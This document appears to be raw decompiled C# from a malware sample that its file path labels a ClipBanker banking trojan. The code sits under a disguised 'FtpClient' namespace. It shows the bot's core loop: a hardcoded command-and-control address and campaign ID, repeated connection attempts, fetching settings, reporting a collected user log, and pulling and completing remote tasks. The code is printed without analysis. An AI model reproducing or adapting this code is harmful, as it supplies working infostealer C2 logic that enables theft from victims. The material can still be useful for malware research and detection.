// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Core.Launchers.Executor
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Core.LogParsers;
using FtpClient.Data.Extensions;
using FtpClient.Models.Core;
using FtpClient.Models.Info;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;

namespace FtpClient.Data.Core.Launchers
{
  public class Executor : XmlParser
  {
    private object IP { get; }

    private object ID { get; }

    public Executor(IEnumerable<IFileShield> fileShields = null)
      : base(fileShields)
    {
      this.IP = (object) "86.107.197.8:3213";
      this.ID = (object) "EU_TEST_V2";
    }

    public override XmlParser Init(ICommunicator communicator)
    {
      Task task = new Task((Action) (() => Thread.Sleep(1000)));
      task.Start();
      while (!task.Wait(1000))
        Thread.Sleep(5000);
      bool flag = false;
      while (!flag)
      {
        // ISSUE: reference to a compiler-generated field
        if (Executor.\u003C\u003Eo__7.\u003C\u003Ep__3 == null)
        {
          // ISSUE: reference to a compiler-generated field
          Executor.\u003C\u003Eo__7.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, IEnumerable>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (IEnumerable), typeof (Executor)));
        }
        // ISSUE: reference to a compiler-generated field
        Func<CallSite, object, IEnumerable> target1 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__3.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, IEnumerable>> p3 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__3;
        // ISSUE: reference to a compiler-generated field
        if (Executor.\u003C\u003Eo__7.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          Executor.\u003C\u003Eo__7.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, char, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Split", (IEnumerable<Type>) null, typeof (Executor), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj1 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__0.Target((CallSite) Executor.\u003C\u003Eo__7.\u003C\u003Ep__0, this.IP, '|');
        foreach (object obj2 in target1((CallSite) p3, obj1))
        {
          // ISSUE: reference to a compiler-generated field
          if (Executor.\u003C\u003Eo__7.\u003C\u003Ep__2 == null)
          {
            // ISSUE: reference to a compiler-generated field
            Executor.\u003C\u003Eo__7.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof (Executor), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
            }));
          }
          // ISSUE: reference to a compiler-generated field
          Func<CallSite, object, bool> target2 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__2.Target;
          // ISSUE: reference to a compiler-generated field
          CallSite<Func<CallSite, object, bool>> p2 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__2;
          // ISSUE: reference to a compiler-generated field
          if (Executor.\u003C\u003Eo__7.\u003C\u003Ep__1 == null)
          {
            // ISSUE: reference to a compiler-generated field
            Executor.\u003C\u003Eo__7.\u003C\u003Ep__1 = CallSite<Func<CallSite, ICommunicator, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Connect", (IEnumerable<Type>) null, typeof (Executor), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
            }));
          }
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          object obj3 = Executor.\u003C\u003Eo__7.\u003C\u003Ep__1.Target((CallSite) Executor.\u003C\u003Eo__7.\u003C\u003Ep__1, communicator, obj2);
          if (target2((CallSite) p2, obj3))
          {
            Instance.Communicator = communicator;
            flag = true;
            break;
          }
        }
        Thread.Sleep(5000);
      }
      return (XmlParser) this;
    }

    public override XmlParser Prepere(BaseLogParser LogParser)
    {
      while (!Instance.Communicator.TryGetSettings(out Instance.clientSettings))
        Thread.Sleep(1000);
      if (!LogParser.TryGet(Instance.clientSettings, out Instance.userLog))
        this.Dispose();
      ref InfoClass1 local = ref Instance.userLog;
      // ISSUE: reference to a compiler-generated field
      if (Executor.\u003C\u003Eo__8.\u003C\u003Ep__0 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Executor.\u003C\u003Eo__8.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (string), typeof (Executor)));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      string str = Executor.\u003C\u003Eo__8.\u003C\u003Ep__0.Target((CallSite) Executor.\u003C\u003Eo__8.\u003C\u003Ep__0, this.ID);
      local.Object2 = str;
      return (XmlParser) this;
    }

    public override XmlParser Parse()
    {
      while (!Instance.Communicator.TryReport((object) Instance.userLog))
        Thread.Sleep(5000);
      InfoClass1 userLog = Instance.userLog;
      Instance.userLog.Object9 = new InfoClass8();
      IList<InfoClass2> remoteTasks;
      while (!Instance.Communicator.TryGetTasks(Instance.userLog, out remoteTasks))
        Thread.Sleep(1000);
      remoteTasks = remoteTasks.IsNull<IList<InfoClass2>>((IList<InfoClass2>) new List<InfoClass2>());
      foreach (InfoClass2 infoClass2 in new Finilizer().TryGet((object) userLog, (object) remoteTasks) ?? (IEnumerable<InfoClass2>) new List<InfoClass2>())
      {
        while (!Instance.Communicator.TryCompleteTask(Instance.userLog, infoClass2.Object1))
          Thread.Sleep(1000);
      }
      return (XmlParser) this;
    }

    public override void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool managed)
    {
    }
  }
}
